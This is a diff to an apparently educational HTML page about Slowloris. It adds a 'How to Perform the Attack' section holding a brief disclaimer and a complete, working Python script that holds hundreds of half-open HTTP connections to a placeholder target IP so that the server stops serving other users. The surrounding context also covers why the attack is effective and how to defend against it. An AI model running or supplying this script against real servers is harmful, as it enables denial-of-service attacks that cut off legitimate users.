@@ -56,6 +56,58 @@
                 <li>Legitimate users are unable to connect to the server, resulting in a Denial of Service.</li>
             </ol>
         </h2><br>
+        <h1>How to Perform the Attack</h1><br>
+        <h2>
+            <strong>Disclaimer:</strong> This information is for educational purposes only. Performing a Slowloris attack on a server without explicit permission is illegal and can have serious consequences.
+        </h2><br>
+        <h2>
+            A Slowloris attack can be performed using a simple Python script. The following script demonstrates the basic principle of the attack:
+        </h2><br>
+        <pre>
+            <code>
+import socket
+import random
+import time
+
+target_ip = "X.X.X.X"
+target_port = 80
+
+connections = []
+
+def create_socket():
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(4)
+    s.connect((target_ip, target_port))
+    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
+    s.send("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36\r\n".encode("utf-8"))
+    s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
+    return s
+
+for _ in range(200):
+    try:
+        s = create_socket()
+        connections.append(s)
+    except socket.error:
+        break
+
+while True:
+    for s in list(connections):
+        try:
+            s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
+        except socket.error:
+            connections.remove(s)
+
+    for _ in range(200 - len(connections)):
+        try:
+            s = create_socket()
+            connections.append(s)
+        except socket.error:
+            break
+
+    time.sleep(15)
+
+            </code>
+        </pre>
         <h1>Why it's Effective</h1><br>
         <h2>Slowloris is effective because it doesn't require a lot of bandwidth. It's a "low and slow" attack that can be launched from a single machine. It's also difficult to detect because the traffic it generates looks like legitimate, albeit slow, client traffic.</h2><br>
         <h1>How to Defend Against a Slowloris Attack</h1><br>
